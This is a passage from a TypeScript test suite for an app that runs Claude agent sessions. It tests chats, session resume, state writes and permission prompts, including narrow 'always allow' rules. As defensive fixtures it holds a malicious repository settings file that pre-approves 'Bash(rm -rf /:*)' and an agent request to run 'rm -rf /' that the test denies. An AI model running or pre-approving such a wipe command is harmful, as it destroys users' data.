      const { service, workspaceId } = await withWorkspace()

      const first = await service.openChat(workspaceId)
      const second = await service.openChat(workspaceId)

      expect(second.id).toBe(first.id)
      expect(service.listChats(workspaceId)).toHaveLength(1)
    })

    it('starts in the mode the global setting names', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.updateConfig({ workingMode: 'acceptEdits' })

      const chat = await service.openChat(workspaceId)

      expect(chat.workingMode).toBe('acceptEdits')
    })

    it('starts on the effort the global setting names', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.updateConfig({ effort: 'high' })

      const chat = await service.openChat(workspaceId)

      expect(chat.effort).toBe('high')
    })

    it('refuses a workspace that does not exist', async () => {
      const { service } = await withWorkspace()

      await expect(service.openChat('planner/nowhere')).rejects.toThrow(WorkspaceError)
    })

    it('refuses to send to a chat that does not exist', async () => {
      const { service } = await withWorkspace()

      await expect(service.sendToChat('chat-nothing', 'hello')).rejects.toThrow(WorkspaceError)
    })
  })

  describe('a turn', () => {
    it('starts a session in the workspace directory and sends the message', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      const [workspace] = await service.listWorkspaces('planner')

      await service.sendToChat(chat.id, 'add a test')

      await vi.waitFor(() => {
        expect(agent().sent).toEqual(['add a test'])
      })
      expect(agent().options().cwd).toBe(workspace?.path)
    })

    it('reuses the session for the next message rather than starting another', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'first')
      await service.sendToChat(chat.id, 'second')

      expect(agents).toHaveLength(1)
      await vi.waitFor(() => {
        expect(agent().sent).toEqual(['first', 'second'])
      })
    })

    it('creates the chat when the first message arrives at a bare workspace', async () => {
      const { service, workspaceId } = await withWorkspace()

      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      expect(service.listChats(workspaceId)).toHaveLength(1)
    })

    it('marks the workspace as running', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'work')

      const [workspace] = await service.listWorkspaces('planner')
      expect(workspace?.status).toBe('running')
    })

    it('passes the transparency switch through to the SDK', async () => {
      const { service, workspaceId } = await withWorkspace()
      await service.updateConfig({ settingSources: 'project' })
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'work')

      expect(agent().options().settingSources).toEqual(['project'])
    })

    /*
     * The gate. A repository that ships settings would otherwise pre-approve
     * tools and declare shell hooks the moment somebody opened a clone, since
     * octopus loads every source as the CLI does.
     */
    it('gives an unapproved repository only the user\u2019s own layer', async () => {
      const { service, workspaceId } = await withWorkspace()
      const [workspace] = await service.listWorkspaces('planner')
      await mkdir(join(workspace?.path ?? '', '.claude'), { recursive: true })
      await writeFile(
        join(workspace?.path ?? '', '.claude', 'settings.json'),
        '{"permissions":{"allow":["Bash(rm -rf /:*)"]}}',
        'utf8'
      )
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'work')

      expect(agent().options().settingSources).toEqual(['user'])
    })

    it('gives an approved one everything the config says', async () => {
      const { service, workspaceId } = await withWorkspace()
      const [workspace] = await service.listWorkspaces('planner')
      await mkdir(join(workspace?.path ?? '', '.claude'), { recursive: true })
      await writeFile(join(workspace?.path ?? '', '.claude', 'settings.json'), '{}', 'utf8')
      await approveSettingsIn(service, workspaceId)
      const chat = await service.openChat(workspaceId)

      await service.sendToChat(chat.id, 'work')

      expect(agent().options().settingSources).toEqual(['user', 'project', 'local'])
    })

    it('forwards the agent answer to whoever subscribed', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      agent().emit(textMessage('there'))

      await vi.waitFor(() => {
        expect(events).toContainEqual({
          chatId: chat.id,
          workspaceId,
          event: { type: 'text', text: 'there', uuid: 'u-1' }
        })
      })
    })

    it('goes back to idle when the turn ends', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      agent().emit(resultMessage)

      await vi.waitFor(async () => {
        const [workspace] = await service.listWorkspaces('planner')
        expect(workspace?.status).toBe('idle')
      })
    })

    it('marks the workspace as failed when the turn errors', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      agent().emit({
        type: 'result',
        subtype: 'error_during_execution',
        is_error: true,
        total_cost_usd: 0,
        duration_ms: 10,
        usage: { input_tokens: 0, output_tokens: 0 },
        session_id: 'sess-1'
      } as unknown as SDKMessage)

      await vi.waitFor(async () => {
        const [workspace] = await service.listWorkspaces('planner')
        expect(workspace?.status).toBe('error')
      })
    })

    it('marks the workspace as failed when the session itself dies', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      agent().finish(new Error('claude exited with code 1'))

      await vi.waitFor(async () => {
        const [workspace] = await service.listWorkspaces('planner')
        expect(workspace?.status).toBe('error')
      })
      expect(events.at(-1)?.event).toEqual({
        type: 'error',
        message: 'claude exited with code 1'
      })
    })

    it('stops the current turn without ending the session', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      await service.interruptChat(chat.id)

      expect(agent().interrupted()).toBe(1)
      expect(agent().closed()).toBe(0)
    })

    // The button is simply ahead of the agent, which finished between the
    // render and the click.
    it('treats stopping an idle chat as nothing to do', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await expect(service.interruptChat(chat.id)).resolves.toBeUndefined()
    })
  })

  describe('the session id', () => {
    it('is written down as soon as it appears', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      agent().emit(initMessage)

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.sessionId).toBe('sess-1')
      })
    })

    // Which is the whole point of storing it: a conversation has to survive
    // the application being restarted.
    it('is handed back to the SDK to resume after a restart', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')
      agent().emit(initMessage)

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.sessionId).toBe('sess-1')
      })
      await service.closeChats()

      agents = []
      const restarted = await createService({ ...paths(dir), query: fakeQuery() })
      await restarted.sendToChat(chat.id, 'and again')

      expect(agent().options().resume).toBe('sess-1')
    })

    /*
     * An init now arrives after every slash command, not just at the start of
     * a session — measured against a live one. Without the guard each command
     * would rewrite the state file to say what it already said.
     */
    it('is not written again when it has not changed', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      agent().emit(initMessage)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.sessionId).toBe('sess-1')
      })

      const before = await readFile(join(dir, 'state.json'), 'utf8')
      agent().emit(initMessage)
      agent().emit(textMessage('and something after it, so the queue has drained'))
      await vi.waitFor(async () => {
        expect(await service.chatHistory(chat.id)).not.toHaveLength(0)
      })

      expect(await readFile(join(dir, 'state.json'), 'utf8')).toBe(before)
    })

    // A `/clear` opens a new conversation, and the id that resumes it comes in
    // the init that follows — not from the reset, whose own id the CLI refuses.
    it('follows the agent onto a new conversation', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, '/clear')

      agent().emit({
        type: 'system',
        subtype: 'init',
        session_id: 'sess-after-clear'
      } as unknown as SDKMessage)

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.sessionId).toBe('sess-after-clear')
      })
    })
  })

  describe('the subscription window', () => {
    const rateLimitMessage = {
      type: 'rate_limit_event',
      rate_limit_info: {
        status: 'allowed_warning',
        rateLimitType: 'five_hour',
        utilization: 62,
        resetsAt: 1_786_000_000_000
      },
      uuid: 'u-1',
      session_id: 'sess-1'
    } as unknown as SDKMessage

    it('is unknown until a turn has run', async () => {
      const { service } = await withWorkspace()

      expect(service.getRateLimit()).toBeNull()
    })

    it('is remembered from whatever session reported it', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      agent().emit(rateLimitMessage)

      await vi.waitFor(() => {
        expect(service.getRateLimit()).toMatchObject({ status: 'allowed_warning', utilization: 62 })
      })
    })

    // It describes the account at this moment and goes stale on its own; a
    // reading restored from disk that expired overnight is worse than none.
    it('is not written to the state file', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')
      agent().emit(rateLimitMessage)

      await vi.waitFor(() => {
        expect(service.getRateLimit()).not.toBeNull()
      })

      await expect(readFile(join(dir, 'state.json'), 'utf8')).resolves.not.toContain('rate_limit')

      const restarted = await createService({ ...paths(dir), query: fakeQuery() })
      expect(restarted.getRateLimit()).toBeNull()
    })

    // A row in the log saying "you were at 62%" is not something anyone reads
    // back, and it would sit between the messages that are.
    it('never reaches the transcript', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      agent().emit(rateLimitMessage)
      agent().emit(textMessage('done'))

      await vi.waitFor(async () => {
        await expect(service.chatHistory(chat.id)).resolves.toHaveLength(2)
      })
    })
  })

  describe('two writes landing together', () => {
    // `commit` takes a function of the current state rather than a finished
    // one, so a change waiting its turn is computed from the state as it is by
    // then. Given a finished state instead, both of these would be built from
    // the same snapshot and whichever saved second would erase the other.
    //
    // They arrive together in earnest: agent events are handled from a callback
    // nobody awaits, and one turn ends with both an id to record and a status
    // to clear.
    it('keeps both changes rather than the last one', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      agent().emit(initMessage)
      agent().emit(resultMessage)

      await vi.waitFor(async () => {
        expect(service.listChats(workspaceId)[0]?.sessionId).toBe('sess-1')
        const [workspace] = await service.listWorkspaces('planner')
        expect(workspace?.status).toBe('idle')
      })
    })

    // The same two changes have to survive the trip to disk, not merely the
    // copy held in memory: `writeJsonFile` renames one fixed temporary file,
    // and two saves at once race for it.
    it('writes both to the state file', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'work')

      agent().emit(initMessage)
      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.sessionId).toBe('sess-1')
      })

      const restarted = await createService({ ...paths(dir), query: fakeQuery() })
      expect(restarted.listChats(workspaceId)[0]?.sessionId).toBe('sess-1')
      const [workspace] = await restarted.listWorkspaces('planner')
      expect(workspace?.status).toBe('idle')
    })
  })

  describe('the history', () => {
    it('is empty for a chat that has said nothing', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)

      await expect(service.chatHistory(chat.id)).resolves.toEqual([])
    })

    it('keeps what was said on both sides', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'add a test')

      agent().emit(textMessage('done'))

      await vi.waitFor(async () => {
        await expect(service.chatHistory(chat.id)).resolves.toEqual([
          expect.objectContaining({ role: 'user', text: 'add a test' }),
          expect.objectContaining({
            role: 'agent',
            event: { type: 'text', text: 'done', uuid: 'u-1' }
          })
        ])
      })
    })

    // Storing the fragments as well would replay every answer twice.
    it('keeps the finished block rather than the fragments it arrived in', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      agent().emit({
        type: 'stream_event',
        event: {
          type: 'content_block_delta',
          index: 0,
          delta: { type: 'text_delta', text: 'do' }
        },
        parent_tool_use_id: null,
        uuid: 'u-1',
        session_id: 'sess-1'
      } as unknown as SDKMessage)
      agent().emit(textMessage('done'))

      await vi.waitFor(async () => {
        const history = await service.chatHistory(chat.id)
        expect(history).toHaveLength(2)
      })
    })

    it('survives a restart', async () => {
      const { service, workspaceId } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'remember this')

      const restarted = await createService({ ...paths(dir), query: fakeQuery() })

      await expect(restarted.chatHistory(chat.id)).resolves.toHaveLength(1)
    })

    // The transcript directory is a file: nothing can be written there. The
    // session is still running, so this is reported rather than thrown.
    it('reports a write it could not make instead of dying quietly', async () => {
      const repo = join(dir, 'planner')
      await initRepo(repo)

      const service = await createService({ ...paths(dir), query: fakeQuery() })
      const project = await service.addProjectFromPath(repo)
      const workspace = await service.createWorkspaceIn(project.id)

      const events: ChatEvent[] = []
      service.onAgentEvent((event) => events.push(event))

      const chat = await service.openChat(workspace.id)
      await service.sendToChat(chat.id, 'hello')

      await mkdir(join(dir, 'data'), { recursive: true })
      await rm(join(dir, 'data', 'chats'), { recursive: true, force: true })
      await writeFile(join(dir, 'data', 'chats'), 'not a directory', 'utf8')

      agent().emit(textMessage('done'))

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'error')).toBe(true)
      })
    })
  })

  describe('a write that cannot be made', () => {
    // The state file becomes a directory, so the rename that finishes an
    // atomic write has nowhere to land. The session is still running, so this
    // is reported into the chat rather than thrown at nobody.
    it('is reported into the chat rather than lost', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'hello')

      await rm(join(dir, 'state.json'), { force: true })
      await mkdir(join(dir, 'state.json'), { recursive: true })

      agent().emit(resultMessage)

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'error')).toBe(true)
      })
    })
  })

  describe('permissions', () => {
    it('holds the agent until the user answers', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const decision = agent().ask('Edit', { file_path: '/a.rb' })

      await vi.waitFor(() => {
        expect(events.some((entry) => entry.event.type === 'permission_request')).toBe(true)
      })

      const request = events.find((entry) => entry.event.type === 'permission_request')
      if (request?.event.type !== 'permission_request') throw new Error('no request was emitted')

      await service.answerPermission(request.event.requestId, 'allow')

      await expect(decision).resolves.toMatchObject({ behavior: 'allow' })
    })

    /*
     * The sentence that explains an otherwise identical-looking request. Under
     * `acceptEdits` a file inside `.claude/` is asked about while fifty
     * ordinary edits are not, and until this was carried the mode simply looked
     * broken.
     */
    it('carries the bridge\u2019s explanation to the card', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const decision = agent().ask(
        'Edit',
        { file_path: '/w/.claude/skills/demo/SKILL.md' },
        'Claude requested permissions to write to it, but you have not granted it yet.'
      )
      const requestId = await waitForRequest(events)

      const request = events.find((entry) => entry.event.type === 'permission_request')
      expect(request?.event).toMatchObject({
        reason: 'Claude requested permissions to write to it, but you have not granted it yet.'
      })

      // Answered rather than left hanging. An open request is a turn held open,
      // and the transcript write behind it then races the teardown that removes
      // the directory it is being written into.
      await service.answerPermission(requestId, 'deny')
      await decision
    })

    /* Absent rather than empty, so the card has nothing to draw where the
       bridge had nothing to say. */
    it('carries no explanation where the bridge sent none', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const decision = agent().ask('Edit', { file_path: '/a.rb' })
      const requestId = await waitForRequest(events)

      const request = events.find((entry) => entry.event.type === 'permission_request')
      expect(request?.event).not.toHaveProperty('reason')

      await service.answerPermission(requestId, 'deny')
      await decision
    })

    it('says so when the user declines', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'delete it')

      const decision = agent().ask('Bash', { command: 'rm -rf /' })
      const requestId = await waitForRequest(events)

      await service.answerPermission(requestId, 'deny')

      await expect(decision).resolves.toMatchObject({ behavior: 'deny' })
    })

    it('marks the workspace as waiting while the question is open', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      void agent().ask('Edit')
      await waitForRequest(events)

      await vi.waitFor(async () => {
        const [workspace] = await service.listWorkspaces('planner')
        expect(workspace?.status).toBe('waiting_permission')
      })
    })

    // "Always" is stored in the config rather than in the SDK's own rules: with
    // `settingSources: none` the SDK has nowhere to write them, and the answer
    // would be forgotten the moment the session ended.
    it('remembers an "always" beyond the session that asked', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      void agent().ask('Edit')
      const requestId = await waitForRequest(events)
      await service.answerPermission(requestId, 'always')

      expect(service.getConfig().alwaysAllowedTools).toEqual([
        { toolName: 'Edit', ruleContent: null }
      ])

      // The second call must not ask at all.
      await expect(agent().ask('Edit')).resolves.toMatchObject({ behavior: 'allow' })
    })

    // Settings forgetting one rule while the agent's "always" records another:
    // both land, where a list sent whole from the window dropped the new one.
    it('keeps an "always" recorded while another rule is forgotten', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const forgotten = { toolName: 'Bash', ruleContent: 'ls' }
      await service.updateConfig({ alwaysAllowedTools: [forgotten] })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      void agent().ask('Edit')
      const requestId = await waitForRequest(events)
      await Promise.all([
        service.answerPermission(requestId, 'always'),
        service.editConfig({ kind: 'forgetStanding', rule: forgotten })
      ])

      expect(service.getConfig().alwaysAllowedTools).toEqual([
        { toolName: 'Edit', ruleContent: null }
      ])
    })

    /*
     * Each rule is worked out from the list as its write comes round, not as
     * it was when the answer arrived — two answered together otherwise both
     * started from the empty list, and the second stored only itself.
     */
    it('keeps both of two "always" answers given together', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      void agent().ask('Edit')
      void agent().ask('Write')
      const requests = (): string[] =>
        events.flatMap(({ event }) =>
          event.type === 'permission_request' ? [event.requestId] : []
        )
      await vi.waitFor(() => {
        expect(requests()).toHaveLength(2)
      })

      await Promise.all(requests().map((id) => service.answerPermission(id, 'always')))

      expect(service.getConfig().alwaysAllowedTools).toEqual([
        { toolName: 'Edit', ruleContent: null },
        { toolName: 'Write', ruleContent: null }
      ])
    })

    /*
     * The finding this closes. "Always allow" wrote the tool **name**, so
     * answering it about one file under `.claude/` granted every `Edit` in
     * every workspace from then on — an approval an order of magnitude wider
     * than the question asked, and the kind that gets granted once and
     * regretted quietly.
     */
    it('stores the narrow rule the bridge named, not the tool it used', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      void agent().ask('Edit', { file_path: '/w/.claude/skills/demo/SKILL.md' }, undefined, [
        {
          type: 'addRules',
          behavior: 'allow',
          destination: 'session',
          rules: [{ toolName: 'Edit', ruleContent: '/w/.claude/skills/**' }]
        }
      ])
      const requestId = await waitForRequest(events)
      await service.answerPermission(requestId, 'always')

      expect(service.getConfig().alwaysAllowedTools).toEqual([
        { toolName: 'Edit', ruleContent: '/w/.claude/skills/**' }
      ])
    })

    /* And the rule is honoured where it applies and nowhere else — which is the
       half that would be missing if the config held it and nothing read it. */
    it('waves through the place it was granted and asks about anywhere else', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      await service.updateConfig({
        alwaysAllowedTools: [{ toolName: 'Edit', ruleContent: '/w/docs/**' }]
      })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      await expect(agent().ask('Edit', { file_path: '/w/docs/ui.md' })).resolves.toMatchObject({
        behavior: 'allow'
      })
      expect(events.some((entry) => entry.event.type === 'permission_request')).toBe(false)

      const asked = agent().ask('Edit', { file_path: '/w/src/core/service.ts' })
      const requestId = await waitForRequest(events)

      // Answered rather than left hanging: an open request is a turn held open,
      // and the transcript write behind it then races the teardown.
      await service.answerPermission(requestId, 'deny')
      await asked
    })

    /* A suggestion that is not an allow-rule, or is about another tool, is not
       an answer to this question — so the fallback stands and the whole tool is
       granted, which is what the user pressed. */
    it('ignores a suggestion that is not about this call', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      void agent().ask('Edit', { file_path: '/w/a.ts' }, undefined, [
        { type: 'setMode', mode: 'acceptEdits', destination: 'session' },
        {
          type: 'addRules',
          behavior: 'deny',
          destination: 'session',
          rules: [{ toolName: 'Edit', ruleContent: '/w/**' }]
        },
        {
          type: 'addRules',
          behavior: 'allow',
          destination: 'session',
          rules: [{ toolName: 'Write', ruleContent: '/w/**' }]
        }
      ])
      const requestId = await waitForRequest(events)
      await service.answerPermission(requestId, 'always')

      expect(service.getConfig().alwaysAllowedTools).toEqual([
        { toolName: 'Edit', ruleContent: null }
      ])
    })

    /* A rule the bridge sent without a place is the whole tool, which is what
       the field being absent means. */
    it('reads a suggestion with no place as the whole tool', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      void agent().ask('Edit', { file_path: '/w/a.ts' }, undefined, [
        {
          type: 'addRules',
          behavior: 'allow',
          destination: 'session',
          rules: [{ toolName: 'Edit' }]
        }
      ])
      const requestId = await waitForRequest(events)
      await service.answerPermission(requestId, 'always')

      expect(service.getConfig().alwaysAllowedTools).toEqual([
        { toolName: 'Edit', ruleContent: null }
      ])
    })

    /* An older CLI sends no suggestion, and a question about nothing in
       particular has none to send. The whole tool is what every answer of
       "always" meant before any of this. */
    it('falls back to the whole tool where the bridge suggested nothing', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'run it')

      void agent().ask('Bash', { command: 'ls' })
      const requestId = await waitForRequest(events)
      await service.answerPermission(requestId, 'always')

      expect(service.getConfig().alwaysAllowedTools).toEqual([
        { toolName: 'Bash', ruleContent: null }
      ])
    })

    /*
     * The bridge's word that a standing answer is wider than this question. On
     * exactly those asks it names no narrow rule, so "always" fell back to the
     * whole tool — every `Bash` command from then on, for one `ls`. The card
     * draws no "Always" then; this is the half that holds for a window that
     * sent it anyway.
     */
    it('approves the call and stores nothing where a standing answer is forbidden', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'run it')

      const decision = agent().ask('Bash', { command: 'ls' }, undefined, undefined, {
        suppressAlwaysAllowRule: true
      })
      const requestId = await waitForRequest(events)

      const request = events.find((entry) => entry.event.type === 'permission_request')
      expect(request?.event).toMatchObject({ suppressAlways: true })

      await service.answerPermission(requestId, 'always')

      await expect(decision).resolves.toMatchObject({ behavior: 'allow' })
      await expect(decision).resolves.not.toHaveProperty('updatedPermissions')
      expect(service.getConfig().alwaysAllowedTools).toEqual([])
    })

    /*
     * The bridge took the question back. The card kept live buttons until the
     * turn ended and pressing them reached nothing; now the request is let go
     * the moment it is withdrawn, and the window is told so.
     */
    it('lets go of a question the bridge withdraws', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'run it')

      const withdraw = new AbortController()
      const decision = agent().ask('Bash', { command: 'ls' }, undefined, undefined, {
        signal: withdraw.signal
      })
      const requestId = await waitForRequest(events)
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('waiting_permission')
      })

      withdraw.abort()

      await expect(decision).resolves.toMatchObject({ behavior: 'deny' })
      expect(events.map((entry) => entry.event)).toContainEqual({
        type: 'permission_withdrawn',
        requestId
      })
      expect(service.pendingPermissions(chat.id)).toEqual([])
      // The turn goes on without the answer, as it does after a refusal.
      await vi.waitFor(() => {
        expect(service.listChats(workspaceId)[0]?.status).toBe('running')
      })
    })

    /*
     * What the window hears last is what is stored. Both status writes used to
     * decide whether to announce against the record as it was before either
     * landed, so a question withdrawn before its wait was written announced
     * the wait and never its end: the tab stayed amber over a running turn.
     */
    it('tells the window the turn goes on when a question is withdrawn at once', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'run it')
      const heard: ChatStatusEvent[] = []
      service.onChatStatus((event) => heard.push(event))

      const withdraw = new AbortController()
      const decision = agent().ask('Bash', { command: 'ls' }, undefined, undefined, {
        signal: withdraw.signal
      })
      await waitForRequest(events)
      withdraw.abort()
      await decision

      await vi.waitFor(() => {
        expect(heard.at(-1)?.status).toBe('running')
      })
      expect(service.listChats(workspaceId)[0]?.status).toBe('running')
    })

    it('takes nothing back from a question already answered', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'run it')

      const withdraw = new AbortController()
      const decision = agent().ask('Bash', { command: 'ls' }, undefined, undefined, {
        signal: withdraw.signal
      })
      const requestId = await waitForRequest(events)
      await service.answerPermission(requestId, 'allow')
      await expect(decision).resolves.toMatchObject({ behavior: 'allow' })

      withdraw.abort()

      expect(events.some((entry) => entry.event.type === 'permission_withdrawn')).toBe(false)
    })

    /* Without this the very next call asks again: the SDK knows nothing about a
       list octopus keeps itself, and the reply that releases the tool call is
       the only place a rule can ride along. */
    it('tells the running session the rule as well as the config', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      const suggestion = {
        type: 'addRules' as const,
        behavior: 'allow' as const,
        destination: 'session' as const,
        rules: [{ toolName: 'Edit', ruleContent: '/w/docs/**' }]
      }
      const decision = agent().ask('Edit', { file_path: '/w/docs/ui.md' }, undefined, [suggestion])
      const requestId = await waitForRequest(events)
      await service.answerPermission(requestId, 'always')

      await expect(decision).resolves.toMatchObject({ updatedPermissions: [suggestion] })
    })

    it('does not list a tool twice however often it is waved through', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      await service.updateConfig({
        alwaysAllowedTools: [{ toolName: 'Edit', ruleContent: null }]
      })
      const chat = await service.openChat(workspaceId)
      await service.sendToChat(chat.id, 'edit it')

      // Already allowed, so this one never reaches the user.
      await expect(agent().ask('Edit')).resolves.toMatchObject({ behavior: 'allow' })
      expect(events.some((entry) => entry.event.type === 'permission_request')).toBe(false)

      void agent().ask('Write')
      const requestId = await waitForRequest(events)
      await service.answerPermission(requestId, 'always')

      expect(service.getConfig().alwaysAllowedTools).toEqual([
        { toolName: 'Edit', ruleContent: null },
        { toolName: 'Write', ruleContent: null }
      ])
    })

    /*
     * Approving a plan is the moment planning ends, and both halves of that
     * have to happen or the interface starts lying: the stored record, so the
     * next session does not begin by planning all over again, and the running
     * session, so the work the plan describes can actually start.
     *
     * It hands over to `acceptEdits` whatever the conversation was asking
     * before. The composer's one control cycles through asking, accepting and
     * planning, so nothing is left to say what should follow a plan — and a
     * plan read and approved is the edits accepted in advance.
     */
    it('leaves planning for acceptEdits when a plan is approved and that is the setting', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      await service.updateConfig({ planExecutionMode: 'acceptEdits' })
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')
      expect(service.listChats(workspaceId)[0]?.workingMode).toBe('default')

      const decision = agent().ask('ExitPlanMode', { plan: '# Do the thing' })
      await service.answerPermission(await waitForRequest(events), 'allow')

      await expect(decision).resolves.toEqual({
        behavior: 'allow',
        updatedInput: { plan: '# Do the thing' },
        updatedPermissions: [{ type: 'setMode', mode: 'acceptEdits', destination: 'session' }]
      })
      expect(service.listChats(workspaceId)[0]?.planMode).toBe(false)
      // Stored as well as sent, so the composer names the mode that is
      // actually running and the next session starts in it.
      expect(service.listChats(workspaceId)[0]?.workingMode).toBe('acceptEdits')
    })

    // Auto is the setting's default: the plan is what a person reads, and the
    // classifier watches each step of carrying it out.
    it('leaves planning for auto mode when a plan is approved, by default', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', { plan: '# Do the thing' })
      await service.answerPermission(await waitForRequest(events), 'allow')

      await expect(decision).resolves.toMatchObject({
        updatedPermissions: [{ type: 'setMode', mode: 'auto', destination: 'session' }]
      })
      expect(service.listChats(workspaceId)[0]?.workingMode).toBe('auto')
    })

    // Already in auto mode, a plan goes back to it whatever the setting says:
    // Accept edits would be a step down nobody asked for.
    it('goes back to auto mode after a plan begun from it', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      await service.updateConfig({ planExecutionMode: 'acceptEdits' })
      const chat = await service.openChat(workspaceId)
      await service.setChatWorkingMode(chat.id, 'auto')
      await service.setChatPlanMode(chat.id, true)
      await service.sendToChat(chat.id, 'plan it')

      const decision = agent().ask('ExitPlanMode', { plan: '# Do the thing' })
      await service.answerPermission(await waitForRequest(events), 'allow')

      await expect(decision).resolves.toMatchObject({
        updatedPermissions: [{ type: 'setMode', mode: 'auto', destination: 'session' }]
      })
      expect(service.listChats(workspaceId)[0]?.workingMode).toBe('auto')
    })

    // Auto came from the plan, so losing it goes to the plan's other way of
    // being carried out rather than to Manual, which would ask about every
    // step the user has just approved.
    it('falls back to acceptEdits when auto mode reached through a plan is refused', async () => {
      const { service, workspaceId, events } = await withWorkspace()
      const chat = await service.openChat(workspaceId)
      await service.setChatPlanMode(chat.id, true)
